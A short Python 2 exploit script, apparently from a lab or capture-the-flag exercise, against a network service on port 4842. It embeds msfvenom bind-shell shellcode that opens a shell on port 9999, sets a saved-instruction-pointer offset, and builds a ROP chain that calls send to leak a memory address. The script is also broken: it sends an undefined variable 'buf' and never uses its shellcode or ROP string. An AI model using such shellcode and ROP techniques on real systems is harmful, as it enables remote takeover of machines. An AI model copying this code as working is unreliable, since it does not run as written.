#!/usr/bin/python

import sys
import struct
import socket
import time

if len(sys.argv) < 2:
    print "usage: %s <target>" % sys.argv[0]
    sys.exit(-1)

#/msfvenom -p linux/x86/shell_bind_tcp LPORT=9999 -f ruby
sh = (
"\x31\xdb\xf7\xe3\x53\x43\x53\x6a\x02\x89\xe1\xb0\x66\xcd" +
"\x80\x5b\x5e\x52\x68\x02\x00\x27\x0f\x6a\x10\x51\x50\x89" +
"\xe1\x6a\x66\x58\xcd\x80\x89\x41\x04\xb3\x04\xb0\x66\xcd" +
"\x80\x43\xb0\x66\xcd\x80\x93\x59\x6a\x3f\x58\xcd\x80\x49" +
"\x79\xf8\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3" +
"\x50\x53\x89\xe1\xb0\x0b\xcd\x80"
)    
    
s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)

s.connect((sys.argv[1], 4842))
s.recv(1024)

eip_off=326
hrop = [
    0x08048770, #send
    0xdeadbeef,
    0x4,
    0x0804B0B8,
    4,
    0
  ]
rop=""
for i in hrop:
  rop += struct.pack('I', i)

sys.stderr.write("[+] sending %d bytes\n" % len(buf))
s.send(buf)
rbuf= s.recv(1024)
if len(rbuf) == 0:
    sys.stderr.write("[+] :( nothing received\n")
else:
    sys.stderr.write("[+] received %d bytes\n" % len(rbuf) )
    print(hex(struct.unpack("I", rbuf)[0] ))
s.close()